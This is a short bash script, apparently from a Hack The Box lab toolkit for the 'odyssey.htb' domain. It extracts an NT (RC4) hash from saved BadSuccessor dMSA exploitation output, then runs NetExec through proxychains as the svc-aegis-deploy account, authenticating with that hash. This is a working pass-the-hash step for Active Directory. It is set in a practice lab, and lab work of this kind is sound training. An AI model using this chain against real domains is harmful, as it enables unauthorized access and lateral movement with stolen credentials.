#!/usr/bin/env bash
set -euo pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

nt_hash=${DEPLOY_NT_HASH:-}
badsuccessor_file="$odyssey_root/responses/badsuccessor.txt"
if [[ -z "$nt_hash" && -f "$badsuccessor_file" ]]; then
  nt_hash=$(sed -n '/dMSA previous keys found/,/^[[:space:]]*$/s/^RC4: \([0-9a-fA-F]\{32\}\)$/\1/p' "$badsuccessor_file" | head -n 1)
fi
[[ "$nt_hash" =~ ^[0-9a-fA-F]{32}$ ]] || {
  printf 'deploy NT hash not found\n' >&2
  exit 1
}

require_socks
exec proxychains4 -q nxc "$@" -d odyssey.htb -u svc-aegis-deploy -H "$nt_hash"
